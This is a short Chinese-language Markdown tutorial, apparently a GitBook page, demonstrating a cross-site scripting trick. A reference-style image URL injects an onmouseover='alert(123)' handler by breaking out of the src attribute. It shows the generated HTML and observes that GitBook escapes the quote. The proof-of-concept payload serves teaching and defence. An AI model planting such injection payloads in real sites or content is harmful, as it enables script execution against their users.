# Markdown XSS 圖片攻擊

## 滑鼠滑過事件

***程式碼***

```markdown
[滑鼠滑過事件][1]
[1]: http://www.googl.com.tw/img.jpg#"onmouseover='alert(123)'
```

***產生 Markdown HTML***

```html
<img src="http://www.googl.com.tw/img.jpg#" onmouseover='alert(123)' alt="滑鼠滑過事件">
```

***Demo***

![滑鼠滑過事件][1]

> 在 gitbook 有將特殊字元 " 字串轉換成無法執行的 ```&quot;```，所以 gitbook 沒有這方面的漏洞


## 參考資料
* [XSS等web安全漏洞的防范](http://deadhorse.me/nodejs/2012/09/20/xss_in_cnode.html)


[1]: http://www.googl.com.tw/img.jpg#"onmouseover='alert(123)'